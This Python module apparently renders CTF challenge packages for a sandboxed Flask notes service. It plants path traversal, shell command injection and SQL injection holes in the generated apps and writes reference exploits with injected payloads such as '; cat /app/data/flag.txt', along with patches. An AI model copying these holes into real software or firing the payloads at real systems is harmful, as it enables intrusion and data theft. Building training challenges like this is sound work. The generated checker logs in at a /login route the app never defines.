"""AI-008: Deterministic ChallengeSpec renderer for Flask-notes-v1 template.

Same (spec, seed, template_version) always produces byte-identical files.
No wall-clock time, no random global state, no host-specific paths.
"""

from __future__ import annotations

import hashlib
import json
import textwrap
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from .agent_contracts import ChallengeSpec, canonical_json

# Approved staging root; all rendering must stay under this.
_DEFAULT_STAGING_ROOT = Path(__file__).resolve().parents[2] / "challenges" / "staging"

# Seeded variation tables (index = seed % len)
_ROUTE_PREFIXES = ["export", "download", "fetch", "retrieve", "read"]
_ENTITY_LABELS = ["Note", "Memo", "Entry", "Record", "Item"]
_TABLE_NAMES = ["notes", "memos", "entries", "records", "items"]
_DECOY_PATHS = ["/ping", "/echo", "/version", "/info", "/status"]


def _seed_pick(seed: int, table: list[str]) -> str:
    return table[seed % len(table)]


# ---------------------------------------------------------------------------
# Rendered file generators
# ---------------------------------------------------------------------------

def _render_app(spec: ChallengeSpec) -> str:
    seed = spec.seed
    route = spec.route_name
    param = spec.parameter_name
    entity = spec.entity_name
    table = _seed_pick(seed, _TABLE_NAMES)
    label = _seed_pick(seed, _ENTITY_LABELS)

    decoy_code = ""
    for i in range(spec.decoy_endpoints):
        dp = _DECOY_PATHS[i % len(_DECOY_PATHS)]
        decoy_code += f'\n    @app.get("{dp}")\n    def decoy_{i}():\n        return {{"status": "ok"}}\n'

    if spec.vulnerability == "path_traversal":
        vuln_route = textwrap.dedent(f"""\
    @app.get("/{route}")
    def vuln_route():
        import os
        name = request.args.get("{param}") or ""
        if not name:
            return render_template("export.html", body=None, error=None)
        target = os.path.join(str(DATA_DIR / "{table}"), name)
        try:
            body = open(target, "rb").read().decode("utf-8", errors="replace")
        except FileNotFoundError:
            return render_template("export.html", body=None, error="not found"), 404
        except OSError as exc:
            return render_template("export.html", body=None, error=str(exc)), 400
        return render_template("export.html", body=body, error=None)
""")
    elif spec.vulnerability == "command_injection":
        vuln_route = textwrap.dedent(f"""\
    @app.route("/{route}", methods=["GET", "POST"])
    def vuln_route():
        import subprocess
        output = None
        val = ""
        if request.method == "POST":
            val = (request.form.get("{param}") or "").strip()
            if val:
                cmd = f"ping -c 1 -W 1 {{val}}"
                try:
                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)  # noqa: S602
                    output = proc.stdout + proc.stderr
                except subprocess.TimeoutExpired:
                    output = "timed out"
        return render_template("export.html", body=output, error=None)
""")
    else:  # sql_injection
        vuln_route = textwrap.dedent(f"""\
    @app.route("/{route}", methods=["GET", "POST"])
    def vuln_route():
        result = None
        val = ""
        if request.method == "POST":
            val = (request.form.get("{param}") or "").strip()
            db = get_db()
            query = f"SELECT id, title, body FROM {table} WHERE owner_id = '{{val}}' LIMIT 10"
            try:
                rows = db.execute(query).fetchall()
                result = [dict(r) for r in rows]
            except Exception as exc:
                result = [{{"error": str(exc)}}]
        return render_template("export.html", body=json.dumps(result) if result else None, error=None)
""")

    vuln_route = textwrap.indent(vuln_route.strip(), "    ")

    return textwrap.dedent(f"""\
\"\"\"Generated {label} service — template flask-notes-v1 / seed {seed}.\"\"\"
# GENERATED — do not edit; re-render from ChallengeSpec to change.
from __future__ import annotations
import json
import logging
import os
import secrets
import sqlite3
from pathlib import Path
from flask import Flask, g, redirect, render_template, request, session, url_for, abort

DATA_DIR = Path(os.environ.get("DATA_DIR", "/app/data"))
DB_PATH = Path(os.environ.get("DB_PATH", str(DATA_DIR / "app.db")))
FLAG_FILE = Path(os.environ.get("FLAG_FILE", str(DATA_DIR / "flag.txt")))
NOTES_DIR = DATA_DIR / "{table}"
TEAM_ID = os.environ.get("TEAM_ID", "0")
TEAM_NAME = os.environ.get("TEAM_NAME", "Team 0")
SECRET_KEY = os.environ.get("SECRET_KEY", "sandcastle-default-secret")
CHECKER_USERNAME = os.environ.get("CHECKER_USERNAME", f"checker-team{{TEAM_ID}}")
CHECKER_PASSWORD = os.environ.get("CHECKER_PASSWORD", "checker-dev-password")
PLANT_TOKEN = os.environ.get("PLANT_TOKEN", "checker-dev-plant-token")
SERVICE_PORT = int(os.environ.get("SERVICE_PORT", "8080"))

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("{entity}")

SCHEMA = \"\"\"
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    is_admin INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS {table} (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    owner_id INTEGER NOT NULL REFERENCES users(id),
    title TEXT NOT NULL,
    body TEXT NOT NULL,
    is_secret INTEGER NOT NULL DEFAULT 0,
    created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
);
\"\"\"

def get_db():
    db = getattr(g, "_database", None)
    if db is None:
        db = sqlite3.connect(DB_PATH)
        db.row_factory = sqlite3.Row
        g._database = db
    return db

def ensure_flag():
    if FLAG_FILE.exists():
        return FLAG_FILE.read_text().strip()
    flag = f"FLAG{{{{secrets.token_hex(16)}}}}"
    FLAG_FILE.parent.mkdir(parents=True, exist_ok=True)
    FLAG_FILE.write_text(flag + "\\n")
    return flag

def create_app():
    app = Flask(__name__)
    app.secret_key = SECRET_KEY
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    NOTES_DIR.mkdir(parents=True, exist_ok=True)
    with app.app_context():
        db = get_db()
        db.executescript(SCHEMA)
        db.commit()
        db.execute(
            "INSERT INTO users (username, password, is_admin) VALUES (?, ?, 1) "
            "ON CONFLICT(username) DO UPDATE SET password=excluded.password",
            (CHECKER_USERNAME, CHECKER_PASSWORD),
        )
        flag = ensure_flag()
        checker_id = db.execute("SELECT id FROM users WHERE username = ?", (CHECKER_USERNAME,)).fetchone()["id"]
        if db.execute("SELECT id FROM {table} WHERE owner_id = ? AND is_secret = 1", (checker_id,)).fetchone() is None:
            db.execute(
                "INSERT INTO {table} (owner_id, title, body, is_secret) VALUES (?, ?, ?, 1)",
                (checker_id, "flag storage", f"The current flag is: {{flag}}"),
            )
        db.commit()
        db.close()
        g._database = None

    @app.teardown_appcontext
    def _close(e):
        db = getattr(g, "_database", None)
        if db: db.close()

    @app.get("/")
    def index():
        return render_template("index.html")

    @app.get("/health")
    def health():
        return {{"status": "ok"}}

{vuln_route}
{decoy_code}

    @app.post("/internal/plant")
    def plant_flag():
        token = request.headers.get("X-Plant-Token") or ""
        if not secrets.compare_digest(token, PLANT_TOKEN):
            abort(403)
        new_flag = (request.json or {{}}).get("flag")
        if not new_flag:
            return {{"error": "missing flag"}}, 400
        FLAG_FILE.write_text(new_flag.strip() + "\\n")
        db = get_db()
        checker_id = db.execute("SELECT id FROM users WHERE username = ?", (CHECKER_USERNAME,)).fetchone()["id"]
        db.execute(
            "UPDATE {table} SET body = ? WHERE owner_id = ? AND is_secret = 1",
            (f"The current flag is: {{new_flag.strip()}}", checker_id),
        )
        db.commit()
        return {{"status": "planted"}}

    return app

app = create_app()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=SERVICE_PORT, debug=False)  # noqa: S104
""")


def _render_requirements() -> str:
    return "flask>=3.0\ngunicorn>=21.0\n"


def _render_dockerfile(spec: ChallengeSpec) -> str:
    return textwrap.dedent(f"""\
# Generated Dockerfile — flask-notes-v1 / seed {spec.seed}
# syntax=docker/dockerfile:1.6
FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1 \\
    PYTHONUNBUFFERED=1 \\
    PIP_NO_CACHE_DIR=1 \\
    DATA_DIR=/app/data \\
    SERVICE_PORT=8080

RUN apt-get update \\
    && apt-get install -y --no-install-recommends iputils-ping ca-certificates \\
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY app/requirements.txt /app/requirements.txt
RUN pip install --no-cache-dir -r /app/requirements.txt
COPY app /app/app

RUN useradd --create-home --uid 10001 appuser \\
    && mkdir -p /app/data \\
    && chown -R appuser:appuser /app

USER appuser
EXPOSE 8080
CMD ["sh", "-c", "exec gunicorn --workers 1 --threads 4 --timeout 30 --bind 0.0.0.0:${{SERVICE_PORT}} --chdir /app/app app:app"]
""")


def _render_compose(spec: ChallengeSpec, render_id: str) -> str:
    project = f"sandcastle-cand-{render_id[:8]}"
    return textwrap.dedent(f"""\
# Generated docker-compose — flask-notes-v1 / seed {spec.seed}
# Project: {project}  (isolated build; no host networking; no elevated mode)
services:
  app:
    build: .
    image: {project}:latest
    environment:
      - SERVICE_PORT=8080
      - DATA_DIR=/app/data
    ports:
      - "8080"
    volumes:
      - app_data:/app/data
    restart: "no"
    read_only: false
    security_opt:
      - no-new-privileges:true

volumes:
  app_data:
""")



def _render_checker(spec: ChallengeSpec) -> str:
    table = _seed_pick(spec.seed, _TABLE_NAMES)
    return textwrap.dedent(f"""\
\"\"\"Generated checker — flask-notes-v1 / seed {spec.seed}.\"\"\"
# GENERATED
from __future__ import annotations
import json
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar

FLAG_RE = r"FLAG{{[a-f0-9]{{32}}}}"
SERVICE_PORT = 8080
CHECKER_USERNAME_ENV = "CHECKER_USERNAME"
CHECKER_PASSWORD_ENV = "CHECKER_PASSWORD"
PLANT_TOKEN_ENV = "PLANT_TOKEN"

import os

def _session(host, port, timeout=5.0):
    base = f"http://{{host}}:{{port}}"
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    return base, opener, timeout

def put(host, port, flag, plant_token, timeout=5.0):
    base, opener, t = _session(host, port, timeout)
    data = json.dumps({{"flag": flag}}).encode()
    req = urllib.request.Request(f"{{base}}/internal/plant", data=data,
        headers={{"Content-Type": "application/json", "X-Plant-Token": plant_token}})
    with opener.open(req, timeout=t) as r:
        assert r.status == 200
    return "planted"

def get(host, port, flag, username, password, timeout=5.0):
    base, opener, t = _session(host, port, timeout)
    data = urllib.parse.urlencode({{"username": username, "password": password}}).encode()
    req = urllib.request.Request(f"{{base}}/login", data=data,
        headers={{"Content-Type": "application/x-www-form-urlencoded"}})
    with opener.open(req, timeout=t) as r:
        body = r.read().decode()
    assert flag in body, "flag not found in {table} after login"
    return "ok"

def check(host, port, timeout=5.0):
    base, opener, t = _session(host, port, timeout)
    with opener.open(f"{{base}}/health", timeout=t) as r:
        data = json.loads(r.read())
    assert data.get("status") == "ok", f"health check failed: {{data}}"
    return "ok"

if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "check"
    host = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    port = int(sys.argv[3]) if len(sys.argv) > 3 else SERVICE_PORT
    if cmd == "check":
        print(check(host, port))
    elif cmd == "put":
        print(put(host, port, sys.argv[4], os.environ.get(PLANT_TOKEN_ENV, "")))
    elif cmd == "get":
        print(get(host, port, sys.argv[4],
            os.environ.get(CHECKER_USERNAME_ENV, "checker"),
            os.environ.get(CHECKER_PASSWORD_ENV, "checker-dev-password")))
""")


def _render_exploit(spec: ChallengeSpec) -> str:
    param = spec.parameter_name
    route = spec.route_name
    vuln = spec.vulnerability
    if vuln == "path_traversal":
        return textwrap.dedent(f"""\
\"\"\"Reference exploit: path traversal via /{route}?{param}=../flag.txt\"\"\"
# GENERATED
import sys, urllib.request
def exploit(host, port=8080):
    url = f"http://{{host}}:{{port}}/{route}?{param}=../flag.txt"
    with urllib.request.urlopen(url, timeout=5) as r:
        body = r.read().decode()
    import re
    flags = re.findall(r"FLAG{{[a-f0-9]{{32}}}}", body)
    return flags[0] if flags else None
if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    flag = exploit(host)
    print(flag if flag else "no flag captured")
    sys.exit(0 if flag else 1)
""")
    elif vuln == "command_injection":
        return textwrap.dedent(f"""\
\"\"\"Reference exploit: command injection via /{route}\"\"\"
# GENERATED
import sys, urllib.parse, urllib.request
def exploit(host, port=8080):
    payload = urllib.parse.urlencode({{"{param}": "127.0.0.1; cat /app/data/flag.txt"}}).encode()
    req = urllib.request.Request(f"http://{{host}}:{{port}}/{route}", data=payload,
        headers={{"Content-Type": "application/x-www-form-urlencoded"}})
    with urllib.request.urlopen(req, timeout=5) as r:
        body = r.read().decode()
    import re
    flags = re.findall(r"FLAG{{[a-f0-9]{{32}}}}", body)
    return flags[0] if flags else None
if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    flag = exploit(host)
    print(flag if flag else "no flag captured")
    sys.exit(0 if flag else 1)
""")
    else:  # sql_injection
        return textwrap.dedent(f"""\
\"\"\"Reference exploit: SQL injection via /{route}\"\"\"
# GENERATED
import sys, urllib.parse, urllib.request
def exploit(host, port=8080):
    payload = urllib.parse.urlencode({{"{param}": "1 OR 1=1"}}).encode()
    req = urllib.request.Request(f"http://{{host}}:{{port}}/{route}", data=payload,
        headers={{"Content-Type": "application/x-www-form-urlencoded"}})
    with urllib.request.urlopen(req, timeout=5) as r:
        body = r.read().decode()
    import re
    flags = re.findall(r"FLAG{{[a-f0-9]{{32}}}}", body)
    return flags[0] if flags else None
if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    flag = exploit(host)
    print(flag if flag else "no flag captured")
    sys.exit(0 if flag else 1)
""")


def _render_patch(spec: ChallengeSpec) -> str:
    table = _seed_tick(spec.seed)
    vuln = spec.vulnerability
    if vuln == "path_traversal":
        return textwrap.dedent(f"""\
--- a/app/app.py
+++ b/app/app.py
@@ -1 +1 @@
-        target = os.path.join(str(DATA_DIR / "{table}"), name)
+        safe = Path(DATA_DIR / "{table}" / name).resolve()
+        if not str(safe).startswith(str((DATA_DIR / "{table}").resolve())):
+            return render_template("export.html", body=None, error="forbidden"), 403
+        target = str(safe)
""")
    elif vuln == "command_injection":
        return textwrap.dedent("""\
--- a/app/app.py
+++ b/app/app.py
@@ -1 +1 @@
-                cmd = f"ping -c 1 -W 1 {val}"
+                import re
+                if not re.fullmatch(r"[\\d.]+", val):
+                    output = "invalid host"
+                else:
+                    cmd = ["ping", "-c", "1", "-W", "1", val]
""")
    else:
        return textwrap.dedent(f"""\
--- a/app/app.py
+++ b/app/app.py
@@ -1 +1 @@
-            query = f"SELECT id, title, body FROM {table} WHERE owner_id = '{{val}}' LIMIT 10"
+            rows = db.execute("SELECT id, title, body FROM {table} WHERE owner_id = ? LIMIT 10", (val,)).fetchall()
""")


def _seed_tick(seed: int) -> str:
    return _seed_pick(seed, _TABLE_NAMES)


def _render_index_html(spec: ChallengeSpec) -> str:
    label = _seed_pick(spec.seed, _ENTITY_LABELS)
    return textwrap.dedent(f"""\
<!DOCTYPE html>
<html>
<head><title>{label}s — Sandcastle CTF</title></head>
<body>
<h1>{label}s</h1>
<p>Welcome to the {label.lower()} service.</p>
</body>
</html>
""")


def _render_export_html() -> str:
    return textwrap.dedent("""\
<!DOCTYPE html>
<html>
<head><title>Export</title></head>
<body>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
{% if body %}<pre>{{ body }}</pre>{% endif %}
</body>
</html>
""")


def _render_readme(spec: ChallengeSpec, render_id: str) -> str:
    return textwrap.dedent(f"""\
# Generated Challenge — {spec.template_version}

- **Render ID:** {render_id}
- **Seed:** {spec.seed}
- **Vulnerability:** {spec.vulnerability}
- **Difficulty:** {spec.difficulty}
- **Template version:** {spec.template_version}

## Generated by Sandcastle ChallengeGeneratorAgent

This candidate was rendered deterministically from a ChallengeSpec.
Do NOT deploy to production or outside the Sandcastle CTF network.

## Files

- `app/app.py` — Flask application with intentional vulnerability
- `Dockerfile`, `docker-compose.yml` — isolated build (no host socket, no privileged)
- `checker.py` — PUT/GET/CHECK implementation
- `exploits/exploit_{spec.vulnerability}.py` — reference exploit
- `patches/patch_{spec.vulnerability}.diff` — reference patch
""")


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


@dataclass
class RenderedCandidate:
    render_id: str
    spec: ChallengeSpec
    staging_dir: Path
    file_digests: dict[str, str] = field(default_factory=dict)

    def manifest(self) -> dict[str, Any]:
        return {
            "render_id": self.render_id,
            "spec": self.spec.as_dict(),
            "file_digests": self.file_digests,
            "template_version": self.spec.template_version,
        }


def _sha256(content: str | bytes) -> str:
    if isinstance(content, str):
        content = content.encode()
    return hashlib.sha256(content).hexdigest()


def _write(path: Path, content: str) -> str:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return _sha256(content)


def render(
    spec: ChallengeSpec,
    staging_root: Path | None = None,
) -> RenderedCandidate:
    """Render a ChallengeSpec to a staged candidate directory.

    Returns a RenderedCandidate with the render_id, staging_dir, and
    SHA-256 digest of every generated file.

    Raises ValueError for unsafe or unsupported spec values.
    Raises RuntimeError if the staging path escapes the staging root.
    """
    if staging_root is None:
        staging_root = _DEFAULT_STAGING_ROOT
    staging_root = staging_root.resolve()

    # Derive render_id deterministically (no uuid4, no wall-clock time)
    render_id = hashlib.sha256(
        canonical_json(spec.as_dict()).encode()
    ).hexdigest()[:16]

    candidate_dir = (staging_root / render_id).resolve()
    if not str(candidate_dir).startswith(str(staging_root)):
        raise RuntimeError("candidate path escapes staging root")

    digests: dict[str, str] = {}

    files: dict[str, str] = {
        "app/app.py": _render_app(spec),
        "app/requirements.txt": _render_requirements(),
        "app/templates/index.html": _render_index_html(spec),
        "app/templates/export.html": _render_export_html(),
        "Dockerfile": _render_dockerfile(spec),
        "docker-compose.yml": _render_compose(spec, render_id),
        "checker.py": _render_checker(spec),
        f"exploits/exploit_{spec.vulnerability}.py": _render_exploit(spec),
        f"patches/patch_{spec.vulnerability}.diff": _render_patch(spec),
        "README.md": _render_readme(spec, render_id),
        ".dockerignore": "__pycache__\n*.pyc\n*.pyo\n.git\n",
    }

    for rel, content in files.items():
        target = (candidate_dir / rel).resolve()
        if not str(target).startswith(str(candidate_dir)):
            raise RuntimeError(f"generated path escapes candidate dir: {rel}")
        digests[rel] = _write(target, content)

    # Write manifest last (includes digests of all other files)
    candidate = RenderedCandidate(
        render_id=render_id,
        spec=spec,
        staging_dir=candidate_dir,
        file_digests=digests,
    )
    manifest_path = candidate_dir / "manifest.json"
    manifest_path.write_text(
        json.dumps(candidate.manifest(), indent=2, sort_keys=True),
        encoding="utf-8",
    )
    digests["manifest.json"] = _sha256(manifest_path.read_text())

    return candidate
